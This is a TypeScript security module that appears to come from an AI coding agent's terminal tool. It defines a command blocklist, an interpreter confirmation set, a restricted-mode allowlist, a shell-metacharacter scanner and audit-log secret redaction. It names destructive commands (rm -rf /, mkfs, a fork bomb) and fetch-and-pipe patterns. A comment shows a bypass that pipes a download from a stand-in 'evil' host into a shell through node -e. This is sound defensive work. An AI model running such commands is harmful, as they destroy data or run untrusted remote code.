/**
 * commandBlocklist.ts — Layer 1 pure logic for terminal command safety.
 *
 * Ported from: `Kovix_2.0/src/vs/platform/construct/common/terminal/terminalExecutor.ts` (298L)
 * Port strategy: PORT WITH TRANSLATION. The old file mixed the ITerminalExecutor
 * interface (Layer 1) with the runtime helpers (blocklist, allowlist, interpreter
 * detector, rate limiter, audit-log redactor). We split: pure-logic helpers live
 * here (Layer 1, no `vscode` import); the concrete child_process impl lives in
 * `src/terminal/terminalExecutor.ts` (Layer 2). The interface is co-located with
 * the impl for simplicity (single small interface).
 *
 * 02_ARCHITECTURE.md §3 folder structure lists this as `src/terminal/commandBlocklist.ts`
 * Layer 1 port-verbatim. The translation is mechanical: removed DI markers,
 * removed `_serviceBrand`, kept every security-relevant pattern unchanged.
 *
 * What this module owns (preserved from old repo):
 *   - COMMAND_BLOCKLIST: regex patterns that are refused outright.
 *     Examples: `rm -rf /`, `mkfs`, `:(){ :|:& };:`, `curl.*|.*sh`.
 *   - INTERPRETER_COMMANDS: commands that can execute arbitrary code via
 *     crafted arguments (node, python, npx, npm, curl, wget, docker, ...).
 *     When restricted mode is OFF, these still pop a confirmation dialog
 *     before execution (mirrors edit_file's diff-approval flow).
 *   - DEFAULT_COMMAND_ALLOWLIST: the restricted-mode safe set. Notably
 *     EXCLUDES all interpreters (H4 fix preserved verbatim from old repo).
 *   - isCommandInAllowlist(): strict-equality check (H4 fix — old code's
 *     `startsWith` allowed `curl-evil` to match `curl`).
 *   - isInterpreterCommand(): used by run_command tool's pre-spawn gate.
 *   - detectShellMetacharInArgs(): SEC-3 argument metachar scanner.
 *   - sanitiseForAuditLog(): redacts secrets from command strings before
 *     they hit the audit log (SEC-3 + SEC-7 L3 fix).
 *
 * Deferred to a later Phase 3 round:
 *   - TerminalRateLimiter (10 cmds / 30s) — owned by the agent loop, not
 *     the executor. Will be applied in Round 2C when agentLoopService lands.
 *
 * Decisions referenced: D-001 (file-by-file audit), D-011 (extension route),
 * SEC-3, SEC-7 H4 fix (interpreter allowlist removed + strict equality),
 * SEC-7 L3 fix (expanded secret patterns for audit logs).
 */

// ---------------------------------------------------------------------------
// COMMAND_BLOCKLIST — refused outright by the executor
// ---------------------------------------------------------------------------

/**
 * Regex patterns for commands that are ALWAYS blocked, regardless of mode.
 * Matches against the raw command string with the `i` (case-insensitive) flag.
 *
 * Preserved verbatim from old repo (constructToolRegistryService.ts:38-43).
 */
export const COMMAND_BLOCKLIST: readonly string[] = [
        'rm -rf /', 'format c:', 'del /s /q c:\\\\', 'mkfs', 'dd if=',
        ':(){ :|:& };:', 'wget.*|.*sh', 'curl.*|.*sh',
        'shutdown', 'reboot', 'halt', 'poweroff',
        'sudo rm', 'chmod -R 777 /', 'chown -R',
];

/**
 * Check if a command matches any blocked pattern.
 * Used by the run_command tool before spawning.
 *
 * Defence-in-depth: if any pattern fails to compile as a regex (e.g. a
 * backslash-escaping bug was introduced), we log a warning to stderr and
 * skip that pattern rather than throwing. Throwing would silently bypass
 * the ENTIRE blocklist for any command that doesn't match earlier patterns
 * — a critical security regression. The fail-safe direction is to keep
 * checking the remaining patterns and return false only if none match.
 *
 * Bug found during Round 2C test-audit: the pattern `'del /s /q c:\\'`
 * (single trailing backslash) compiled to an invalid regex and made
 * `isBlockedCommand('ls -la')` THROW, which would have caused
 * `run_command` to reject every legitimate command. Fixed by escaping
 * the backslash (`'del /s /q c:\\\\'`) and by adding this try/catch.
 */
export function isBlockedCommand(command: string): boolean {
        for (const pattern of COMMAND_BLOCKLIST) {
                let regex: RegExp;
                try {
                        regex = new RegExp(pattern, 'i');
                } catch (err) {
                        // A malformed pattern in the blocklist is a bug, but it must
                        // NOT disable the rest of the security check. Log and skip.
                        // (console.error rather than logger to avoid a circular import
                        // — this is Layer 1 pure logic, the logger is Layer 2.)
                        console.error(`[commandBlocklist] Malformed regex pattern "${pattern}": ${err instanceof Error ? err.message : String(err)}`);
                        continue;
                }
                if (regex.test(command)) {
                        return true;
                }
        }
        return false;
}

// ---------------------------------------------------------------------------
// INTERPRETER_COMMANDS — require explicit user confirmation
// ---------------------------------------------------------------------------

/**
 * SEC-7 (H4 fix preserved verbatim): Commands that can execute arbitrary code
 * when given a crafted argument. When restricted mode is OFF (user explicitly
 * disabled it), these still trigger an interactive confirmation dialog before
 * execution — mirroring the edit_file diff-approval flow.
 *
 * Why all interpreters are in this set (not in DEFAULT_COMMAND_ALLOWLIST):
 *   `node -e "require('child_process').execSync('curl evil|sh')"` passes any
 *   command-name check because `node` is trusted, but the dangerous code lives
 *   inside a quoted string literal the metachar detector can't see. Same for
 *   `npx -y some-malicious-pkg`. Same for `curl http://evil | sh` patterns.
 *
 * Users who need interpreters can disable restricted mode — they're then
 * outside the default-safety posture and every command pops a confirmation.
 */
export const INTERPRETER_COMMANDS: ReadonlySet<string> = new Set([
        'node', 'python', 'python3', 'pip', 'pip3',
        'npx', 'npm', 'yarn', 'pnpm',
        'cargo', 'rustc', 'go', 'dotnet',
        'java', 'javac', 'mvn', 'gradle',
        'make', 'cmake', 'gcc', 'g++', 'clang',
        'tsc', 'sh', 'bash', 'zsh', 'fish',
        'curl', 'wget',  // can fetch-and-pipe
        'docker', 'podman', 'kubectl',  // can mount/run arbitrary images
]);

/**
 * SEC-7 (H4 fix): Check whether a command's FIRST token is an interpreter
 * command. The check is on the base command name (after stripping any path
 * prefix, e.g. `/usr/bin/node` → `node`).
 */
export function isInterpreterCommand(command: string): boolean {
        const baseCommand = command.trim().split(/\s+/)[0];
        const commandName = baseCommand.split('/').pop() ?? baseCommand;
        return INTERPRETER_COMMANDS.has(commandName);
}

// ---------------------------------------------------------------------------
// DEFAULT_COMMAND_ALLOWLIST — restricted-mode safe set
// ---------------------------------------------------------------------------

/**
 * SEC-3 + SEC-7 (H4 fix preserved verbatim): Default allowlist for
 * restricted mode. Only these commands are allowed when the user has not
 * explicitly disabled restricted mode.
 *
 * Interpreters (node, python, npx, npm, ...) are deliberately ABSENT —
 * see INTERPRETER_COMMANDS doc above for the rationale.
 *
 * `curl` and `wget` are also absent — they can fetch-and-pipe to shell.
 */
export const DEFAULT_COMMAND_ALLOWLIST: readonly string[] = [
        // Read-only file/listing commands
        'ls', 'dir', 'cat', 'head', 'tail', 'grep', 'rg', 'find', 'wc',
        'echo', 'pwd', 'whoami', 'which', 'where', 'env', 'printenv',
        // File mutations that don't escape the workspace
        'mkdir', 'touch', 'cp', 'mv',
        // Text-processing
        'sed', 'awk', 'sort', 'uniq', 'diff', 'patch',
        // Read-only VCS
        'git',
        // Container runtimes (read-only by default; user installed them)
        'docker', 'podman', 'kubectl',
        // Test runners (execute code, but only code the user wrote)
        'jest', 'vitest', 'mocha', 'eslint', 'prettier',
];

/**
 * SEC-7 (H4 fix preserved verbatim): Strict-equality allowlist check.
 *
 * Old code used `commandName.startsWith(allowed)` which let `curl-evil`
 * match `curl` and `npx-foo` match `npx`. We require exact equality after
 * stripping any path prefix.
 */
export function isCommandInAllowlist(
        command: string,
        allowlist?: readonly string[],
): boolean {
        const list = allowlist ?? DEFAULT_COMMAND_ALLOWLIST;
        const baseCommand = command.trim().split(/\s+/)[0];
        const commandName = baseCommand.split('/').pop() ?? baseCommand;
        return list.some(allowed => commandName === allowed);
}

// ---------------------------------------------------------------------------
// Shell metacharacter detection (SEC-3)
// ---------------------------------------------------------------------------

/**
 * SEC-3: Shell metacharacters that could chain commands when combined with
 * user-provided arguments. These are stripped/rejected from ARGUMENTS only
 * (not the command itself).
 */
export const SHELL_METACHAR_BLOCKLIST: readonly string[] = [
        ';', '&&', '||', '|', '`', '$(', ')', '{', '}', '>>', '>', '<', '2>',
];

/**
 * SEC-7 (L1 fix preserved verbatim): Proper alternation regex that matches
 * each metachar independently. The old regex had `\|`` which matched pipe-
 * followed-by-backtick, not backtick alone — a typo that left backticks
 * inside arguments unflagged.
 */
const SHELL_METACHAR_REGEX = /;|&&|\|\||\||`|\$\(|\{|}|\d*>|</;

/**
 * SEC-3: Check if a command's arguments contain shell metacharacters.
 * Returns the matched character if found, or null if clean.
 *
 * Note: this scans the FULL command string (including the base command name).
 * Callers should split off the base command first if they only want to scan
 * arguments. The run_command tool calls this on the full command for
 * defence-in-depth — the base command name cannot legitimately contain
 * any of these metacharacters.
 */
export function detectShellMetacharInArgs(args: string): string | null {
        const match = args.match(SHELL_METACHAR_REGEX);
        return match ? match[0] : null;
}

// ---------------------------------------------------------------------------
// Audit-log secret redaction (SEC-3 + SEC-7 L3 fix)
// ---------------------------------------------------------------------------

// K2-M4 unification (completed in Round 2C test-audit): the audit-log
// redaction now delegates to the canonical `redactSecrets()` in
// `src/security/secretPatterns.ts`. Previously this file maintained its
// OWN copy of the pattern list, which had drifted:
//   - The OpenAI pattern here was `/sk-[A-Za-z0-9]{20,}/g` (no dashes),
//     so `sk-proj-...` keys were NOT redacted in audit logs.
//   - The GitHub PAT pattern here was `/ghp_[A-Za-z0-9]{20,}/g` (loose
//     length), while the canonical pattern is `ghp_[A-Za-z0-9]{36,}`.
//   - The case-insensitive env-var pattern here was missing the
//     UPPER_CASE-only `upper_env_secret` pattern entirely.
// Routing through `redactSecrets()` closes all of these gaps in one go
// and ensures future additions to the canonical list automatically apply
// to audit logs too.
import { redactSecrets } from '../security/secretPatterns';

/**
 * SEC-3: Sanitise a command (or any text) for audit logging.
 * Redacts any matched secret pattern with `[REDACTED:<pattern-name>]`.
 *
 * Used by the run_command tool before writing the command to the output
 * channel, and by the (future) audit log service when persisting tool calls.
 *
 * Delegates to the canonical `redactSecrets()` so the audit-log path and
 * the promptSanitiser path share one pattern set (K2-M4 fix).
 */
export function sanitiseForAuditLog(text: string): string {
        return redactSecrets(text);
}
